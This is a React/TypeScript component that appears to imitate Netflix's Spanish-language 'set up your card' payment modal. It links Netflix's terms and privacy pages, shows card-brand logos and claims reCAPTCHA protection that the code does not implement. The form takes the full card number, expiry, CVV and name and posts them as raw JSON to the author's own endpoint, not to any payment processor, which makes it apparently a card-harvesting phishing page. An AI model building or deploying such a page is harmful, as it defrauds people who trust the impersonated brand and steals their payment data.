import React, { useState } from "react";
import "./tarjetaStyles.css";

interface TarjetaPagoProps {
  onPaymentSuccess: () => void;
}

export default function TarjetaPago({ onPaymentSuccess }: TarjetaPagoProps) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardName, setCardName] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  interface PaymentData {
    NumeroDeTarjeta: string;
    FechaDeVencimiento: string;
    CVV: string;
    NombreDeTarjeta: string;
  }

  interface ApiResponse {
    message?: string;
  }

  const validateAndSubmit = async (e: React.FormEvent<HTMLFormElement>): Promise<void> => {
    e.preventDefault();

    // Validaciones básicas
    const cardNumberRegex = /^\d{16}$/; // 16 dígitos para número de tarjeta
    const expiryDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/; // Formato MM/YY
    const cvvRegex = /^\d{3}$/; // 3 dígitos para CVV

    if (
      !cardNumberRegex.test(cardNumber) ||
      !expiryDateRegex.test(expiryDate) ||
      !cvvRegex.test(cvv) ||
      cardName.trim() === ""
    ) {
      setErrorMessage("Por favor, completa todos los campos correctamente.");
      return;
    }

    setErrorMessage(""); // Limpia el mensaje de error si la validación es exitosa

    const data: PaymentData = {
      NumeroDeTarjeta: cardNumber,
      FechaDeVencimiento: expiryDate,
      CVV: cvv,
      NombreDeTarjeta: cardName,
    };

    try {
      const response = await fetch("http://localhost:5000/api/enviar", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result: ApiResponse = await response.json();
      if (response.status === 201) {
        onPaymentSuccess(); // Callback en caso de éxito
      } else {
        setErrorMessage(result.message || "Error al procesar el pago.");
      }
    } catch (error) {
      setErrorMessage("Error de conexión. Intenta nuevamente.");
    }
  };

  return (
    <div className="tarjetaPago-overlay">
      <div className="tarjetaPago-modal">
        <h2 className="tarjetaPago-title">Configura tu tarjeta de crédito o débito</h2>
        <div className="tarjetaPago-logos">
          <img alt="Visa" className="tarjetaPago-logo" src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/VISA-YO2sYpasfsBgXW99iEUBppBwrvx6UN.png" width="40" height="25" />
          <img alt="Mastercard" className="tarjetaPago-logo" src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/mater-ZoeFvD5IXZpsC5qJtbuJVPqxFbplgA.png" width="40" height="25" />
          <img alt="American Express" className="tarjetaPago-logo" src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/AMEX-3lRBmCLXNfVVNgCZNOeJZDlA8k2aN9.png" width="40" height="25" />
        </div>

        <form className="tarjetaPago-form" onSubmit={validateAndSubmit}>
          <input
            type="text"
            placeholder="Número de tarjeta"
            maxLength={16}
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            className="tarjetaPago-input tarjetaPago-cardNumber"
            required
          />
          <div className="tarjetaPago-inputGroup">
            <input
              type="text"
              placeholder="Fecha de vencimiento (MM/YY)"
              maxLength={5}
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              className="tarjetaPago-input tarjetaPago-expiryDate"
              required
            />
            <div className="tarjetaPago-cvvContainer">
              <input
                type="text"
                placeholder="CVV"
                maxLength={3}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className="tarjetaPago-input tarjetaPago-cvv"
                aria-label="Código CVV"
                required
              />
              <button
                type="button"
                className="tarjetaPago-cvvHelpButton"
                title="El CVV son los 3 dígitos al dorso de tu tarjeta"
              >
                ?
              </button>
            </div>
          </div>
          <input
            type="text"
            placeholder="Nombre en la tarjeta"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
            className="tarjetaPago-input tarjetaPago-cardName"
            required
          />
          {errorMessage && <p className="error-message">{errorMessage}</p>}
          <button type="submit" className="tarjetaPago-submitButton">
            Guardar información de pago
          </button>
        </form>

        <div className="tarjetaPago-info">
          <p>
            Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.
          </p>
          <p>
            Al hacer clic en «Guardar información de pago», aceptas nuestros{" "}
            <a href="https://help.netflix.com/legal/termsofuse" target="_blank" rel="noopener noreferrer" className="tarjetaPago-link">
              Términos de uso
            </a>{" "}
            y nuestra{" "}
            <a href="https://help.netflix.com/legal/privacy" target="_blank" rel="noopener noreferrer" className="tarjetaPago-link">
              Declaración de privacidad
            </a>
            .
          </p>
        </div>
        <p className="tarjetaPago-recaptcha">
          Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.{" "}
          <a href="https://www.google.com/recaptcha/about/" target="_blank" rel="noopener noreferrer" className="tarjetaPago-link">
            Más info
          </a>
        </p>
      </div>
    </div>
  );
}

